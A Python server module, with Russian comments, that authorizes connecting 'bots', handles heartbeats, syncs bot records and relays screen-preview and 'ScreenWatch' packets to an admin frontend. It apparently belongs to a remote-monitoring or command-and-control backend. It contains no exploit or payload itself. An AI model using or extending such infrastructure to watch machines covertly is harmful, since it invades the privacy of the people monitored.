# backend/Core/ClientConnection.py

import asyncio
import socket
import json

from logs import Log as logger
from backend.Services.Auth import authorize_client, sync_bot_data, BOTS_FILE
from backend.Services.ClientManager import client as active_clients
from backend.Services.ClientManager import close_client
from backend.BenchUtils import add_bytes
from backend.API import manager
from backend.API.protocols import pack_bot_command

# Кэш последних превью в оперативной памяти {client_id: full_packet_bytes}
preview_cache = {}

class BotConnectionHandler:
    async def handle_new_connection(self, reader, writer):
        client_id = None
        ip_addr = writer.get_extra_info("peername")[0]
        self._set_tcp_nodelay(writer)

        try:
            auth = await authorize_client(reader, ip_addr)
            if not auth:
                return await self._force_close(writer)

            client_id, bot_data = auth
            await self._register_bot(client_id, bot_data, writer, reader)

            while True:
                packet = await self._read_packet(reader)
                if not packet:
                    break
                await self._process_packet(client_id, writer, packet)

        except Exception as e:
            logger.error(f"Handler Error [{client_id}]: {e}")
        finally:
            await self._disconnect_bot(client_id, writer)

    async def _register_bot(self, cid, data, writer, reader):
        if cid in active_clients:
            await close_client(cid, send_sleep=False)
        
        active_clients[cid] = (reader, writer)
        data['status'] = 'online'
        
        # 1. Отправляем в таблицу полные данные из БД
        pkt = pack_bot_command(cid, "DataScribe", json.dumps([data]))
        manager.broadcast_packet_sync(pkt)
        
        # 2. Если в RAM есть старое превью — сразу пушим его админу
        if cid in preview_cache:
            manager.broadcast_packet_sync(preview_cache[cid])
            
        logger.info(f"[+] Бот {cid} подключен")

    async def _process_packet(self, cid, writer, packet):
        try:
            id_len, mod_len = packet[0], packet[1]
            module = packet[6 + id_len : 6 + id_len + mod_len].decode('utf-8', errors='ignore')

            add_bytes(len(packet))

            # Логика Heartbeat (Пинг-Понг)
            if module == "Heartbeat":
                return await self._handle_heartbeat(cid, writer)

            # Логика Таблицы (Событийное обновление окна/времени)
            if module == "DataScribe":
                return await self._handle_datascribe(cid, packet)

            # Логика Превью (Кэширование в RAM и проброс)
            if module == "Preview":
                preview_cache[cid] = packet # Сохраняем в память
                return manager.broadcast_packet_sync(packet)

            # Все остальные модули (ScreenWatch и т.д.) — просто транзит
            manager.broadcast_packet_sync(packet)

        except Exception as e:
            logger.error(f"Packet Error [{cid}]: {e}")

    async def _handle_datascribe(self, cid, packet):
        """Мерж данных и обновление таблицы фронтенда"""
        id_len, mod_len = packet[0], packet[1]
        payload = packet[6 + id_len + mod_len:]
        try:
            new_data = json.loads(payload.decode('utf-8'))
            # sync_bot_data обновит Bots_DB.txt и вернет полный объект бота
            full_data = sync_bot_data(cid, new_data)
            full_data['status'] = 'online'
            
            # Важно: упаковываем в список [full_data], так как фронт ждет массив для таблицы
            clean_pkt = pack_bot_command(cid, "DataScribe", json.dumps([full_data]))
            manager.broadcast_packet_sync(clean_pkt)
        except Exception as e:
            logger.error(f"DataScribe Sync Error: {e}")

    async def _handle_heartbeat(self, cid, writer):
        pong = pack_bot_command(cid, "Heartbeat", "pong")
        writer.write(pong)
        await writer.drain()

    async def _disconnect_bot(self, cid, writer):
        """Завершение сессии и отправка оффлайн-статуса из БД"""
        if cid:
            active_clients.pop(cid, None)
            bot_final_data = {"id": cid, "status": "offline"}
            
            if BOTS_FILE.exists():
                try:
                    db = json.loads(BOTS_FILE.read_text(encoding="utf-8"))
                    if cid in db:
                        bot_final_data = {**db[cid], "status": "offline"}
                except: pass

            pkt = pack_bot_command(cid, "DataScribe", json.dumps([bot_final_data]))
            manager.broadcast_packet_sync(pkt)
            logger.warning(f"[-] Бот {cid} покинул туннель")
        
        await self._force_close(writer)

    async def _read_packet(self, reader):
        """Чтение заголовка и тела согласно протоколу"""
        try:
            h = await reader.readexactly(6)
            p_len = int.from_bytes(h[2:6], "big")
            body = await reader.readexactly(h[0] + h[1] + p_len)
            return h + body
        except: return None

    def _set_tcp_nodelay(self, writer):
        """Отключение алгоритма Нагла для минимизации задержек"""
        sock = writer.get_extra_info('socket')
        if sock: sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    async def _force_close(self, writer):
        """Безопасное закрытие сокета"""
        if not writer.is_closing():
            writer.close()
            try: await asyncio.wait_for(writer.wait_closed(), 2.0)
            except: pass